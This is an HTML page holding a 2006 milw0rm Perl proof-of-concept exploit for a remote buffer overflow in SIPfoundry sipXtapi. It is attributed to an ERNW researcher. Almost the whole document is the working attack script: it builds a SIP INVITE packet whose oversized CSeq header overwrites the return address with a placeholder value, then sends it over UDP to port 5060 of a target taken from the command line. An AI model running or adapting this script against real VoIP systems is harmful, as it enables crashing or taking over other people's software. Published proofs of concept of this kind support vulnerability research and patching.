<html><head><title>SIPfoundry sipXtapi (CSeq) Remote Buffer Overflow Exploit PoC</title></head><pre>#!/usr/bin/perl
# PoC Exploit By mthumann@ernw.de
# Remote Buffer Overflow in sipXtapi

use IO::Socket;
#use strict;


print &quot;sipXtapi Exploit by Michael Thumann \n\n&quot;;

if (not $ARGV[0]) {
        print &quot;Usage: sipx.pl &lt;host&gt;\n&quot;;
exit;}

$target=$ARGV[0];
my $source =&quot;127.0.0.1&quot;;
my $target_port = 5060;
my $user =&quot;bad&quot;;
my $eip=&quot;\x41\x41\x41\x41&quot;;
my $cseq =
&quot;\x31\x31\x35\x37\x39\x32\x30\x38&quot;.
&quot;\x39\x32\x33\x37\x33\x31\x36\x31&quot;.
&quot;\x39\x35\x34\x32\x33\x35\x37\x30&quot;.
$eip;
my $packet =&lt;&lt;END;
INVITE sip:user\@$source SIP/2.0\r
To: &lt;sip:$target:$target_port&gt;\r
Via: SIP/2.0/UDP $target:3277\r
From: &quot;moz&quot;&lt;sip:$target:3277&gt;\r
Call-ID: 3121$target\r
CSeq: $cseq\r
Max-Forwards: 70\r
Contact: &lt;sip:$source:5059&gt;\r
\r
END

print &quot;Sending Packet to: &quot; . $target . &quot;\n\n&quot;;
socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(&quot;udp&quot;));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port,$ipaddr);
send(PING, $packet, 0, $sendto) == length($packet) or die &quot;cannot send to $target : $target_port : $!\n&quot;;
print &quot;Done.\n&quot;;

#EoF

# milw0rm.com [2006-07-10]</pre></html>